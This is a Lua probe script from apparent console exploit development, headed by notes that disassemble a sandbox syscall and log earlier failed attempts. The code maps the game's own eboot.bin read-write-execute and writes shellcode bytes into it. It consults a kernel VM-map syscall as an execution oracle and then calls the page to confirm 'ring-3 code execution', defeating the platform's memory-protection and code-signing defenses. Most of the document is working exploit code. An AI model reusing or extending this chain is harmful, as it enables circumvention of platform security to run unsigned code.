-- CRASH_CLASS: MEDIUM (the last step calls into a page we just wrote; if the mapping is
-- not executable the loader dies like 1245a did - that is the measurement)
-- PROBE 1248a: is there ANY way to get an executable mapping?
--
-- 1245a measured that an anonymous mmap with prot=7 is readable and writable but NOT
-- executable (fcall into it faulted with RIP = the page and CS = 0x43). The assumed
-- escape hatch - "mtypeprotect(585) makes it executable" from probe 44a - has just been
-- killed statically: syscall 585's body at 0x8FC610 is
--     8fc61a mov rax,[rdi+8]          ; proc
--     8fc627 mov r15,[rax+0x48]
--     8fc62b lea r14,[r15+0x40]
--     8fc632 call 0xc4bb20            ; lock
--     8fc637 mov rax,[r15+0x10]
--     8fc63d cmp rax,[rip+0x350eecc]
--     8fc647 setne cl
--     8fc64e mov [rbx+0x408],rcx      ; td+0x408 = boolean
--     8fc655 call 0xc4c4b0            ; unlock
--     8fc65a xor eax,eax ; ret
-- It reads NO argument (rsi is never touched), always returns 0, and stores a boolean at
-- td+0x408. That is "is_in_sandbox", exactly the upstream name in sysent-names-13.60.csv.
-- It cannot change a page's protection, so probe 44a's "NOP SLED SURVIVED" was an artifact
-- of the loader's syscall stub, which reloads rax from the syscall.
--
-- What is left is the other half of mmap: a FILE-BACKED mapping. A private COW mapping of
-- a file's text page is writable and, if PROT_EXEC survives for vnode objects, executable.
-- Steps, each one guarded so a failure reports instead of killing the loader:
--   [1] open /app0/eboot.bin
--   [2] mmap it with prot=1 (read only)         -> does file-backed mmap work at all?
--   [3] sanity: the ELF magic must be at offset 0
--   [4] mmap it with prot=5 (read+exec)
--   [5] mmap it with prot=7 (read+write+exec), write "mov eax,0x1234; ret", read it back
--   [6] only if [5] read the bytes back, call it and look for 0x1234
--
-- REV 2 (this run) - three changes:
--   * rev 1 line 78 used '&' (rq(SB+4) & 0xFFFF).  Lua 5.1 has no bitwise operators and
--     the script never loaded ("')' expected ... near '&'").  Masked arithmetically now.
--   * the fstat dump no longer assumes a struct layout: the first 0x100 bytes are printed
--     as hi/lo qword pairs, with the FreeBSD-12 candidates (mode at +0x18, size at +0x70)
--     printed alongside so a wrong guess is visible instead of silently reported.
--   * NEW [5c]: syscall 674 (VM map, 72-byte records, protection at +0x18) is used as a
--     NON-FATAL exec oracle, and it now GATES the fatal call.  The anon prot=7 page is
--     recreated as the control because 1245a proved it cannot execute: if 674 reports
--     EXEC for the control, the field is "what you asked for" and proves nothing, so the
--     call still runs.  If the control reports no EXEC and the file-backed page also
--     reports no EXEC, the kernel strips PROT_EXEC at mmap() time for vnodes too and the
--     call is skipped - we keep the loader and still learn the answer.
print("=== PROBE 1248a: executable file-backed mapping ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function hilo(v) if type(v)=="table" and v.h then return v.h, v.l end return 0, N(v) end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function qs(v) if v == nil then return "????????????????" end local h,l = hilo(v) return string.format("%08X_%08X", h, l) end
local function rd32(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return nil end
local function rb(a) local ok,v=pcall(function() return N(memory.read_byte(a)) end) if ok then return v end return -1 end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function okva(a) return a ~= nil and a > 0 and a < 0x800000000000 end
local function has_bit(v, b) return v ~= nil and (v % (b*2)) >= b end
local function peek(addr, n)
  local s = ""
  for i=0,n-1 do
    local v = rb(addr+i)
    if v >= 0 then s = s .. string.format("%02X", v) else s = s .. "??" end
  end
  return s
end
local function poke(addr, bytes) for i=1,#bytes do wb(addr+i-1, bytes[i]) end end
local function cstr(s, at)
  for k=1,#s do wb(at+k-1, string.byte(s,k)) end
  wb(at+#s, 0)
end

-- ---------------------------------------------------------------- 674 snapshot
local function vm_snapshot()
  local out = {}
  local vbuf = memory.alloc(72 * 512 + 0x100)
  local cp   = memory.alloc(16)
  memory.write_qword(cp, 0)
  local ok = pcall(function()
    return mk(674)(uint64(vbuf), uint64(72), uint64(512), uint64(cp), uint64(0x40000000))
  end)
  if not ok then return nil end
  local n = N(memory.read_dword(cp))
  if n == nil or n <= 0 or n > 512 then return nil end
  for i = 0, n - 1 do
    local b = vbuf + i * 72
    out[#out+1] = { s = N(memory.read_qword(b)), e = N(memory.read_qword(b + 8)),
                    p = N(memory.read_dword(b + 0x18)) }
  end
  return out
end
local function vm_lookup(snap, addr)
  if snap == nil or not okva(addr) then return nil end
  for _, r in ipairs(snap) do
    if r.s <= addr and addr < r.e then return r end
  end
  return nil
end
local function prot_report(snap, tag, addr)
  if not okva(addr) then print(string.format("    %-16s va=0x%X  (no mapping)", tag, addr)) return nil end
  local r = vm_lookup(snap, addr)
  if r == nil then
    print(string.format("    %-16s va=0x%X  NOT FOUND in 674 map", tag, addr))
    return nil
  end
  print(string.format("    %-16s va=0x%X  rec=[0x%X,0x%X) prot=%X  r=%s w=%s x=%s",
        tag, addr, r.s, r.e, r.p,
        tostring(has_bit(r.p,1)), tostring(has_bit(r.p,2)), tostring(has_bit(r.p,4))))
  return r
end

local open  = mk(5)
local mmap  = mk(477)
local fstat = mk(189)

print(string.format("[0] pid=%d", N(mk(20)())))

-- string scratch
local STR = N(mmap(0, 0x1000, 3, 0x1002, -1, 0))
if not okva(STR) then print("=== DONE 1248a (no scratch page) ===") return end
cstr("/app0/eboot.bin", STR)
local fd = N(open(uint64(STR), 0, 0))
print(string.format("[1] open /app0/eboot.bin -> fd=%d errno=\"%s\"", fd, ES()))
if fd < 0 then
  cstr("/app0/eboot.bin", STR)
  fd = N(open(uint64(STR), 0))
  print(string.format("[1b] open 2-arg -> fd=%d errno=\"%s\"", fd, ES()))
end
if fd < 0 then print("=== DONE 1248a (no fd) ===") return end

-- size via fstat into a 0x100 buffer
local SB = N(mmap(0, 0x1000, 3, 0x1002, -1, 0))
if not okva(SB) then print("=== DONE 1248a (no stat page) ===") return end
for i=0,0x1ff do wb(SB+i, 0) end
local rv = N(fstat(fd, uint64(SB)))
print(string.format("[2] fstat -> rv=%d errno=\"%s\"", rv, ES()))
if rv == 0 then
  for r = 0, 0xF0, 0x10 do
    print(string.format("    +%02X %s %s", r, qs(rq(SB+r)), qs(rq(SB+r+8))))
  end
  -- FreeBSD 12 amd64 candidates: mode is the low 16 bits of the dword at +0x18
  -- (mode_t + padding0 + uid), size is the qword at +0x70.
  local d18 = rd32(SB+0x18)
  local uid = rd32(SB+0x1c)
  print(string.format("    candidates: mode=%o (dword@0x18 low16) uid=%s size=%s (qword@0x70)",
        d18 and (d18 % 65536) or -1, tostring(uid), qs(rq(SB+0x70))))
end

-- [3] read-only file mapping, offset 0
local MAP_PRIVATE = 2
local m1 = N(mmap(0, 0x4000, 1, MAP_PRIVATE, fd, 0))
print(string.format("[3] mmap(prot=1, MAP_PRIVATE, off=0) -> 0x%X errno=\"%s\"", m1, ES()))
if okva(m1) then
  local h = peek(m1, 16)
  print(string.format("    bytes at mapping: %s", h))
  if string.sub(h,1,8) == "7F454C46" then print("    *** ELF MAGIC OK - file-backed mmap works ***") end
end

-- [4] read+exec
local m2 = N(mmap(0, 0x4000, 5, MAP_PRIVATE, fd, 0))
print(string.format("[4] mmap(prot=5, MAP_PRIVATE, off=0) -> 0x%X errno=\"%s\"", m2, ES()))

-- [5] read+write+exec then write our own bytes
local m3 = N(mmap(0, 0x4000, 7, MAP_PRIVATE, fd, 0))
print(string.format("[5] mmap(prot=7, MAP_PRIVATE, off=0) -> 0x%X errno=\"%s\"", m3, ES()))
local TARGET = -1
if okva(m3) then
  local before = peek(m3, 8)
  poke(m3, {0xB8,0x34,0x12,0x00,0x00,0xC3})
  local after = peek(m3, 8)
  print(string.format("    before=%s after=%s", before, after))
  if string.sub(after,1,12) == "B834120000C3" then
    TARGET = m3
    print("    *** the mapping is writable - the bytes took ***")
  end
end

-- control: an anonymous prot=7 page, which 1245a already proved cannot execute
local ctrl = N(mmap(0, 0x4000, 7, 0x1002, -1, 0))
if okva(ctrl) then
  poke(ctrl, {0xB8,0x34,0x12,0x00,0x00,0xC3})
  print(string.format("[5b] anon prot=7 control at 0x%X wrote %s", ctrl, peek(ctrl, 8)))
else
  print(string.format("[5b] anon prot=7 control mmap failed (0x%X)", ctrl))
end

-- [5c] the oracle
print("[5c] 674 recorded protection (non-fatal exec oracle; control = anon prot=7)")
local snap = vm_snapshot()
local ctrl_rec, m1_rec, m2_rec, m3_rec
if snap == nil then
  print("    674 unavailable (call failed or count out of range)")
else
  print(string.format("    674 returned %d regions", #snap))
  ctrl_rec = prot_report(snap, "anon prot7 ctrl", ctrl)
  m1_rec   = prot_report(snap, "file prot1", m1)
  m2_rec   = prot_report(snap, "file prot5", m2)
  m3_rec   = prot_report(snap, "file prot7", m3)
end

local do_call, why = false, "674 oracle unavailable - refusing to spend a crash on an uncalibrated guess; run 1251b to force the call"
if ctrl_rec ~= nil and m3_rec ~= nil then
  local ctrl_exec = has_bit(ctrl_rec.p, 4)
  local m3_exec   = has_bit(m3_rec.p, 4)
  if ctrl_exec then
    do_call = false
    why = "control reports EXEC yet 1245a proved it cannot execute - 674 protection is not a predictor, skipping; run 1251b to force the call"
  elseif m3_exec then
    why = "control has no EXEC but the file-backed page does - PROT_EXEC survived for a vnode, calling"
  else
    do_call = false
    why = "control AND file-backed both report no PROT_EXEC - the kernel strips it at mmap() time, skipping the call to keep the loader"
  end
end

-- [6] the call
if TARGET > 0 and do_call then
  print(string.format("[6] %s", why))
  print(string.format("[6] fcall(0x%X) - if this is not executable the loader dies here", TARGET))
  local ok, v = pcall(function() return native.fcall_with_rax(TARGET, 0,0,0,0,0,0,0) end)
  if ok then
    print(string.format("    returned 0x%X  %s", N(v),
          (N(v) == 0x1234) and "*** RING-3 CODE EXECUTION CONFIRMED ***" or ""))
  else
    print("    fcall raised: " .. tostring(v))
  end
elseif TARGET > 0 then
  print(string.format("[6] SKIPPED - %s", why))
else
  print("[6] skipped - no page we could write to")
end

print("=== DONE 1248a ===")
